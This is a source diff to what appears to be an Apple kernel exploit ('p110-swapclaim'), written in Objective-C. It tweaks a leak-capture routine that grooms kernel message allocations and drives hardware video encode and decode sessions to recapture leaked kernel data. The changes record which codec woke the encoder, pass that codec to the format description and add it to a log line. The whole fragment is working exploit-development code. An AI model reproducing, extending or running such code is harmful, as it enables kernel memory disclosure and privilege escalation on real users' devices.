@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v4.3-smokeconfig"
+#define P110_BUILD      @"p110-swapclaim-v4.4-decodecodec"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -688,6 +688,7 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
               @" 1280x720, the stage9 pack) ON THE TAP THREAD — the scaler"
               @" engine opens in-process, then ONE recapture of sel-8.");
             int woke = 0;
+            CMVideoCodecType wakeCodec = kCMVideoCodecType_HEVC;   /* v4.4: set when woke */
             for (int wc = 0; wc < 3 && woke == 0; wc++) {
                 VTCompressionSessionRef ws = NULL;
                 /* v4.2: HEVC HW-encode failed async (-17691) with clean
@@ -755,7 +756,7 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                             usleep(10000);
                         wcb = g_p110_wakeSbN;
                         CVPixelBufferRelease(wpb);
-                        if (est == noErr && wcb > 0) woke = 1;
+                        if (est == noErr && wcb > 0) { woke = 1; wakeCodec = wCodec; }
                     }
                 }
                 NSString *wEncId = nil;
@@ -792,7 +793,7 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                        sample-header API (the macro/prototype drift the
                        local clang flagged). */
                     if (CMVideoFormatDescriptionCreate(
-                            kCFAllocatorDefault, kCMVideoCodecType_HEVC,
+                            kCFAllocatorDefault, wakeCodec,   /* v4.4: match the sample */
                             1280, 720, NULL, &fd) != 0 || !fd) fd = NULL;
                 }
                 if (fd) {
@@ -834,7 +835,8 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
             }
             for (int wi = 0; wi < g_p110_wakeSbN; wi++) CFRelease(g_p110_wakeSb[wi]);
             g_p110_wakeSbN = 0;
-            Lf(@"[leak] DECODE-ARM: %d/%d decoded; create=%d frame errs=[%d %d %d] — recapture sel-8",
+            Lf(@"[leak] DECODE-ARM [codec=%@]: %d/%d decoded; create=%d frame errs=[%d %d %d] — recapture sel-8",
+               (wakeCodec == kCMVideoCodecType_H264) ? @"h264" : @"hevc",
                dec, g_p110_wakeSbN > 0 ? 3 : 0, (int)dstCreate,
                (int)dstErr[0], (int)dstErr[1], (int)dstErr[2]);
             in64 = (uint64_t)(uintptr_t)g_p110_leak_out;
